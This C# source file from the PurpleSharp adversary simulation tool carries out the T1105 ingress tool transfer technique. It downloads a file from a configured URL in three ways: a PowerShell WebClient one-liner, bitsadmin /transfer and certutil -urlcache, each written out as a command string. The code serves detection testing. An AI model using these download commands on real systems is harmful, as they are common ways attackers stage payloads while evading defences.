using PurpleSharp.Lib;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace PurpleSharp.Simulations
{
    class CommandAndControl
    {
        public static void DownloadFilePowerShell(PlaybookTask playbook_task, string log)
        {

            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Console.WriteLine(currentPath);
            Logger logger = new Logger(currentPath + log);
            logger.SimulationHeader("T1105");
            logger.TimestampInfo("Using PowerShell to execute the technique");

            try
            {
                Uri uri = new Uri(playbook_task.url);
                string fileName = Path.GetFileName(uri.LocalPath);
                string pws_download = String.Format("(New-object System.net.Webclient).DownloadFile('{0}','{1}\\{2}')", playbook_task.url, currentPath, fileName);
                ExecutionHelper.StartProcessApi("", String.Format("powershell.exe -command \"{0}\"", pws_download), logger);
                Thread.Sleep(1000 * playbook_task.task_sleep);
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }

        public static void DownloadFileBitsAdmin(PlaybookTask playbook_task, string log)
        {
            // TODO: download does not complete if stdout is hidden with sInfo.dwFlags = 0x00000100 | 0x00000001;
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Console.WriteLine(currentPath);
            Logger logger = new Logger(currentPath + log);
            logger.SimulationHeader("T1105");
            logger.TimestampInfo("Using Bitsadmin to execute the technique");
            try
            {
                Uri uri = new Uri(playbook_task.url);
                string fileName = Path.GetFileName(uri.LocalPath);
                string bitsadmin_cmd = String.Format("bitsadmin /transfer debjob /download /priority normal {0} {1}\\{2}", playbook_task.url, currentPath, fileName);
                ExecutionHelper.StartProcessApi("", String.Format(bitsadmin_cmd), logger);
                Thread.Sleep(1000 * playbook_task.task_sleep);
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }

        public static void DownloadFileCertUtil(PlaybookTask playbook_task, string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Console.WriteLine(currentPath);
            Logger logger = new Logger(currentPath + log);
            logger.SimulationHeader("T1105");
            logger.TimestampInfo("Using certutil to execute the technique");
            try 
            {
                Uri uri = new Uri(playbook_task.url);
                string fileName = Path.GetFileName(uri.LocalPath);
                string certutil_cmd = String.Format("certutil.exe -urlcache -f {0} {1}", playbook_task.url, fileName);
                ExecutionHelper.StartProcessApi("", String.Format(certutil_cmd), logger);
                Thread.Sleep(1000 * playbook_task.task_sleep);
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }

        }

    }
}
